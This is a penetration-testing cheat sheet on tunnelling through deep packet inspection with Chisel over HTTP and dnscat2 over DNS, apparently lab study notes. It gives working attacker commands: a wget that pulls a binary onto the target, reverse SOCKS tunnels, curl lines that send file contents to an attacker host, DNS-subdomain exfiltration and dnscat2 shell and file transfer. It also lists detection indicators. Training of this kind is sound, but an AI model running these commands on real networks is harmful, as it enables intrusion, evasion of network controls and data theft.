# Tunneling Through Deep Packet Inspection - Cheat Sheet

## Core Concepts

### Deep Packet Inspection (DPI)
- **Definition**: Technology that monitors packet contents, not just headers
- **Blocks**: SSH, non-HTTP protocols, unauthorized traffic
- **Solution**: Tunnel data in allowed protocols (HTTP, DNS)

---

## HTTP Tunneling with Chisel

### Overview
- **Tool**: Chisel - HTTP tunneling with SSH encryption
- **Use Case**: Only HTTP traffic allowed through firewall/DPI
- **Protocol**: WebSocket over HTTP
- **Features**: SOCKS proxy, reverse tunneling, cross-platform

### Setup
Just in case we need different chisel version or for different platform - https://github.com/jpillora/chisel/releases

**1. Host Chisel on Kali:**
```bash
sudo cp $(which chisel) /var/www/html/
sudo systemctl start apache2
or python 
```

**2. Download to Target:**
```bash
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

**3. Start Server (Kali):**
```bash
chisel server --port 8080 --reverse
# Creates SOCKS proxy on port 1080

# TCP dump to get connection or error using sending error data -
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

**4. Start Client (Target):**
```bash
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &

In case of no connection lets try to get the error message come up in tcpdump
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```

### Port Forward Types
```bash
# Reverse SOCKS (most common)
chisel client <server>:8080 R:socks                      # Binds to server :1080

# Reverse specific port
chisel client <server>:8080 R:2222:10.4.50.215:22        # Forward specific port

# Standard SOCKS
chisel client <server>:8080 socks                        # Client listens

# Standard port forward
chisel client <server>:8080 4455:172.16.50.217:445       # Client listens :4455
```

### Using the Tunnel

**Install ncat:**
```bash
sudo apt install ncat
```

**SSH through tunnel:**
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@host

# an example -
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
yes
```

**With Proxychains:**
```bash
# Edit /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Use with tools
proxychains ssh user@host
proxychains nmap -sT -Pn -n <target>
```

### Troubleshooting: glibc Issues

**Error**: `GLIBC_2.32 not found` or `GLIBC_2.34 not found`

**Cause**: Chisel compiled with Go 1.20+ needs newer glibc

**Solution**: Use official release (Go 1.19)
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
sudo cp chisel_1.8.1_linux_amd64 /var/www/html/chisel
```

### Debug Technique: Capture Errors
```bash
# Redirect errors to file, send back via HTTP
/tmp/chisel client ... &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```

---

## DNS Tunneling Fundamentals

### DNS Basics
```
Client → Recursive Resolver → Root NS → TLD NS → Authoritative NS → Client
         (e.g., 8.8.8.8)        (.com)    (example.com NS)
```

### DNS Record Types

| Type | Purpose | Example |
|------|---------|---------|
| A | IPv4 address | 192.168.1.1 |
| TXT | Arbitrary text | "any string" |
| CNAME | Alias | alias.example.com |
| MX | Mail server | mail.example.com |

### Data Exfiltration via DNS

**Concept**: Encode data in subdomain names
```bash
# Query encodes data in subdomain
nslookup exfiltrated-data.feline.corp
nslookup 68656c6c6f.feline.corp  # hex: "hello"
```

**Server logs query** → extracts subdomain → recovers data

### Data Infiltration via DNS

**Concept**: Serve data in TXT records

**Configure Dnsmasq:**
```bash
# dnsmasq_txt.conf
no-resolv
no-hosts
auth-zone=feline.corp
auth-server=feline.corp
txt-record=www.feline.corp,payload data here

# Start server
sudo dnsmasq -C dnsmasq_txt.conf -d
```

**Query from client:**
```bash
nslookup -type=txt www.feline.corp
```

---

## DNS Tunneling with dnscat2

### Overview
- **Tool**: dnscat2 - Encrypted DNS tunnel
- **Use Case**: Only DNS allowed outbound
- **Features**: Encryption, port forwarding, file transfer, shell

### Setup

**1. Start Server (Authoritative NS):**
```bash
dnscat2-server feline.corp
# Or with pre-shared secret:
dnscat2-server --secret=password feline.corp
```

**2. Start Client (Compromised Host):**
```bash
./dnscat feline.corp
# Or with secret:
./dnscat --secret=password feline.corp
```

**3. Verify Authentication String:**
- Both client and server display same string
- Example: "Annoy Mona Spiced Outran Stump Visas"
- Verifies no MITM

### Using dnscat2

**List windows:**
```
dnscat2> windows
```

**Switch to command window:**
```
dnscat2> window -i 1
command (hostname) 1>
```

**Available commands:**
```
?               # Help
listen          # Port forward
shell           # Interactive shell
upload          # Upload file
download        # Download file
ping            # Test connection
delay           # Set packet delay
```

### Port Forwarding

**Syntax (like SSH -L):**
```
listen [<lhost>:]<lport> <rhost>:<rport>
```

**Example:**
```
command> listen 127.0.0.1:4455 172.16.2.11:445
```

**Use from server:**
```bash
smbclient -p 4455 -L //127.0.0.1 -U user
```

### Traffic Flow
```
Attack Server (SOCKS :4455) ← DNS (TXT/CNAME/MX) → Client → Internal Target
```

### Performance Notes
- ⚠️ Slow (DNS query latency)
- ⚠️ High visibility (many queries)
- ⚠️ Limited bandwidth
- ✅ Works when only DNS allowed

---

## Quick Comparison

| Feature | Chisel | dnscat2 |
|---------|--------|---------|
| **Protocol** | HTTP/WebSocket | DNS queries |
| **Port** | Any (80/443/8080) | UDP/53 |
| **Speed** | Fast | Slow |
| **Stealth** | Moderate | Very visible |
| **Setup** | Easy | Needs auth NS |
| **SOCKS** | Yes | No |
| **Best For** | HTTP-only envs | DNS-only envs |

### When to Use

**Chisel**: HTTP allowed, need speed, SOCKS flexibility
**dnscat2**: Only DNS allowed, need C2 channel, built-in features

---

## Detection Indicators

### Chisel (HTTP)
```
⚠️ WebSocket upgrade requests
⚠️ User-Agent: Go-http-client/1.1
⚠️ Sec-WebSocket-Protocol: chisel-v3
⚠️ Long-lived HTTP connections
⚠️ High data volume on HTTP
```

### dnscat2 (DNS)
```
⚠️ Excessive DNS queries (100+/min)
⚠️ High-entropy subdomains (random strings)
⚠️ Multiple record types (TXT/CNAME/MX)
⚠️ Large TXT responses
⚠️ Repeated queries to same domain
```

**Example dnscat2 traffic:**
```
TXT?   8f150140b65c73af271ce019c1ede35d28.feline.corp
CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp
MX?    8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp
```

---

## Troubleshooting

### Chisel
```bash
# Verify server listening
ss -ntplu | grep 8080

# Verify SOCKS port
ss -ntplu | grep 1080

# Test with curl
curl http://<server>:8080
```

### dnscat2
```bash
# Verify DNS server
sudo ss -ntplu | grep :53

# Test DNS resolution
nslookup test.feline.corp

# Monitor traffic
sudo tcpdump -i eth0 udp port 53 -vv

# Check client DNS config
resolvectl status
```

### General Debugging
```bash
# Capture command errors
command &> /tmp/output
curl --data @/tmp/output http://attacker:8080/

# Monitor network
sudo tcpdump -i eth0 host <target> -w capture.pcap
```

---

## Command Reference

### Chisel
```bash
# SERVER
chisel server --port 8080 --reverse

# CLIENT
chisel client <srv>:8080 R:socks                    # Reverse SOCKS
chisel client <srv>:8080 R:2222:10.4.50.215:22     # Reverse port
chisel client <srv>:8080 socks                      # Standard SOCKS
chisel client <srv>:8080 4455:172.16.50.217:445    # Standard port
```

### dnscat2
```bash
# SERVER
dnscat2-server feline.corp
dnscat2-server --secret=pass feline.corp

# CLIENT
./dnscat feline.corp
./dnscat --secret=pass feline.corp

# SESSION COMMANDS
windows                              # List windows
window -i 1                          # Switch to window
listen 127.0.0.1:4455 172.16.2.11:445  # Port forward
shell                                # Get shell
upload /local /remote                # Upload
download /remote /local              # Download
delay 1000                          # Set 1s delay
```

### SSH Through Tunnel
```bash
# Via ncat ProxyCommand
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@host

# Via Proxychains
proxychains ssh user@host
```

---

## Lab Checklist

### Chisel
- [ ] Host binary on Apache
- [ ] Start server with --reverse
- [ ] Download to target
- [ ] Handle glibc issues if needed
- [ ] Start client with R:socks
- [ ] Verify SOCKS port (1080)
- [ ] Test SSH through tunnel
- [ ] Clean up processes/files

### dnscat2
- [ ] Start server on auth NS
- [ ] Run client on target
- [ ] Verify auth string matches
- [ ] List windows
- [ ] Create port forward
- [ ] Test connectivity
- [ ] Monitor DNS traffic

---

**End of Cheat Sheet** 🎯
